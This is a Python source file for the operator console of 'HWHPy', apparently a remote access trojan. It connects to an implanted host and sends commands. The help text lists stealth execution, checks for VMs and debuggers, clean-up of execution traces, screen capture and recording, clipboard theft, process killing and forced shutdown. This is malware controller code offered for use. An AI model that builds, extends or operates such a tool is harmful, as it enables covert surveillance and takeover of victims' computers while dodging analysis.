"""
receiver.py - HWHPy Remote Control Client
hwh-dsc.gg/hwhclient

Enter the connection code from host.py to connect and send control commands.
"""

import socket
import base64
import json
import sys
import os
from datetime import datetime

# ── Length-prefixed protocol (must match host.py) ─────────────────────────────
def _recvall(sock: socket.socket, n: int) -> bytes | None:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def send_msg(sock: socket.socket, payload: dict) -> None:
    data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    sock.sendall(len(data).to_bytes(4, "big") + data)


def recv_msg(sock: socket.socket) -> dict | None:
    raw_len = _recvall(sock, 4)
    if raw_len is None:
        return None
    n = int.from_bytes(raw_len, "big")
    raw = _recvall(sock, n)
    if raw is None:
        return None
    return json.loads(raw.decode("utf-8"))


# ── Decode connection code ────────────────────────────────────────────────────
def decode_code(code: str) -> tuple[str, int]:
    padding = 4 - len(code) % 4
    if padding != 4:
        code += "=" * padding
    raw = base64.urlsafe_b64decode(code).decode()
    ip, port_str = raw.rsplit(":", 1)
    return ip, int(port_str)


# ── ANSI colors (red / black theme) ──────────────────────────────────────────
R  = "\033[91m"       # bright red   — main accent
DR = "\033[31m"       # dark red     — secondary / labels
GR = "\033[90m"       # dark gray    — subdued text
WH = "\033[97m"       # bright white — values / output
RS = "\033[0m"        # reset
BD = "\033[1m"        # bold

# ── LAN auto-discovery ────────────────────────────────────────────────────────
DISCOVERY_PORT    = 55556   # must match host.py
DISCOVERY_TIMEOUT = 5       # seconds to wait for a beacon


def auto_discover() -> tuple[str, int] | None:
    """
    Listen for the host's UDP broadcast beacon on the LAN.
    Returns (ip, port) if found within DISCOVERY_TIMEOUT seconds, else None.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("", DISCOVERY_PORT))
        sock.settimeout(DISCOVERY_TIMEOUT)
        data, addr = sock.recvfrom(1024)
        msg = json.loads(data.decode())
        if msg.get("service") == "hwhpy":
            return addr[0], int(msg["port"])
    except Exception:
        return None
    finally:
        sock.close()
    return None


# ── Response handlers ─────────────────────────────────────────────────────────
def _save_screenshot(resp: dict) -> None:
    try:
        img_data  = base64.b64decode(resp["image_b64"])
        ts        = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename  = f"screenshot_{ts}.png"
        save_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
        with open(save_path, "wb") as f:
            f.write(img_data)
        print(f"\n{R}>{RS} Screenshot saved {GR}→{RS} {BD}{filename}{RS}  {GR}({len(img_data) // 1024} KB){RS}\n")
    except Exception as e:
        print(f"\n{DR}! Failed to save screenshot: {e}{RS}\n")


def print_response(resp: dict) -> None:
    if "image_b64" in resp:
        _save_screenshot(resp)
        return

    msg   = resp.get("msg", "")
    lines = msg.splitlines()

    if resp.get("ok"):
        icon = f"{R}>{RS}"
        if len(lines) > 1:
            print(f"\n{icon} {WH}{lines[0]}{RS}")
            for line in lines[1:]:
                print(f"   {GR}{line}{RS}")
            print()
        else:
            print(f"\n{icon} {WH}{msg}{RS}\n")
    else:
        print(f"\n{DR}! {msg}{RS}\n")


# ── UI strings ────────────────────────────────────────────────────────────────
BANNER = f"""{R}{BD}
  ██╗  ██╗██╗    ██╗██╗  ██╗██████╗ ██╗   ██╗
  ██║  ██║██║    ██║██║  ██║██╔══██╗╚██╗ ██╔╝
  ███████║██║ █╗ ██║███████║██████╔╝ ╚████╔╝
  ██╔══██║██║███╗██║██╔══██║██╔═══╝   ╚██╔╝
  ██║  ██║╚███╔███╔╝██║  ██║██║        ██║
  ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝        ╚═╝{RS}
{GR}                    Remote Control Client{RS}
{DR}              hwh-dsc.gg/hwhclient{RS}
"""

HELP_TEXT = f"""
{R}{BD}[ HWHPy — Command Reference ]{RS}  {DR}hwh-dsc.gg/hwhclient{RS}

{DR}{BD}Local commands:{RS}
  {R}help{RS}         Show this help
  {R}quit{RS} / {R}q{RS}    Exit (host keeps running)

{DR}{BD}Processes & Execution:{RS}
  {R}/kill{RS} <process.exe>       Kill all instances of a process
  {R}/list{RS}                     List unique running process names
  {R}/tasklist{RS}                 Detailed list (PID, name, CPU%, RAM)
  {R}/open{RS} <app>               Launch an app on the host
  {R}/exec{RS} <path> [--notemp]   Stealth execute file via SilentExecutor
  {R}/checkenv{RS}                 Check host for VMs/debuggers/analysis tools
  {R}/cleantraces{RS}              Clean temporary execution traces from host

{DR}{BD}Screen:{RS}
  {R}/screenshot{RS}               Capture host screen {GR}→{RS} saved here as PNG
  {R}/record start{RS} [fps] [crf] Start recording (MP4, default 30fps lossless)
  {R}/record stop{RS}              Stop recording and save the MP4 file
  {R}/lockscreen{RS}               Lock the host screen
  {R}/msgbox{RS} <text>            Show a popup on the host screen

{DR}{BD}Network / Web:{RS}
  {R}/block{RS} <domain>           Block a website (host needs admin rights)
  {R}/unblock{RS} <domain>         Unblock a website
  {R}/blocked{RS}                  Show currently blocked websites
  {R}/netstat{RS}                  Show active network connections

{DR}{BD}System:{RS}
  {R}/clipboard{RS}                Read host clipboard content
  {R}/poweroff{RS}                 Shut down host PC in 10 seconds
  {R}/restart{RS}                  Restart host PC in 10 seconds
  {R}/cancelshutdown{RS}           Cancel pending shutdown/restart

{DR}{BD}Connection:{RS}
  {R}/help{RS}                     Show command list (from host)
  {R}/exit{RS}                     Disconnect from host
  {R}/shutdown{RS}                 Close the host server
"""


# ── Main ──────────────────────────────────────────────────────────────────────
def main() -> None:
    os.system("")       # enable ANSI escape codes on Windows
    print(BANNER)

    # ── Auto-discover host on LAN ─────────────────────────────────────────────
    print(f"{GR}Scanning LAN for HWHPy host ({DISCOVERY_TIMEOUT}s)...{RS}")
    found = auto_discover()

    if found:
        ip, port = found
        print(f"{R}>{RS} Host found automatically {GR}→{RS} {BD}{ip}:{port}{RS}\n")
    else:
        # Fallback: manual code entry
        print(f"{DR}! No host found on this network.{RS}")
        print(f"{GR}  Make sure host.py is running on the same WiFi/LAN.{RS}")
        print(f"{GR}  Or enter the connection code manually:{RS}\n")
        while True:
            code = input(f"{DR}code:{RS} ").strip()
            if not code:
                continue
            try:
                ip, port = decode_code(code)
                print(f"  {GR}→ Connecting to {ip}:{port} ...{RS}")
                break
            except Exception:
                print(f"\n{DR}! Invalid code. Please try again.{RS}\n")

    # ── Connect ───────────────────────────────────────────────────────────────
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((ip, port))
        sock.settimeout(60)
        print(f"\n{R}>{RS} Connected to {BD}{ip}:{port}{RS}\n")
    except Exception as e:
        print(f"\n{DR}! Could not connect: {e}{RS}")
        sys.exit(1)

    print(f"  {GR}Type {RS}{R}help{RS}{GR} for the command list.{RS}\n")

    # ── Command loop ──────────────────────────────────────────────────────────
    with sock:
        while True:
            try:
                raw = input(f"{BD}{R}hwhpy{RS}{BD}>{RS} ").strip()
            except (EOFError, KeyboardInterrupt):
                print(f"\n{GR}[hwhpy] Session ended.{RS}")
                break

            if not raw:
                continue

            # Local commands
            if raw.lower() in ("quit", "q"):
                print(f"{GR}[hwhpy] Exiting.{RS}")
                break
            if raw.lower() == "help":
                print(HELP_TEXT)
                continue

            # Remote commands must start with /
            if not raw.startswith("/"):
                print(f"\n{DR}! Commands must start with '/'. Type {RS}{R}help{RS}{DR} for the list.{RS}\n")
                continue

            # Send to host
            try:
                send_msg(sock, {"cmd": raw})
                resp = recv_msg(sock)
                if resp is None:
                    print(f"\n{DR}! Connection to host lost.{RS}\n")
                    break
                print_response(resp)
            except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
                print(f"\n{DR}! Connection to host lost.{RS}\n")
                break
            except Exception as e:
                print(f"\n{DR}! Error: {e}{RS}\n")
                break

            # Stop looping after disconnect commands
            if raw.lower().split()[0] in ("/exit", "/shutdown"):
                print(f"{GR}[hwhpy] Disconnected.{RS}")
                break


if __name__ == "__main__":
    main()
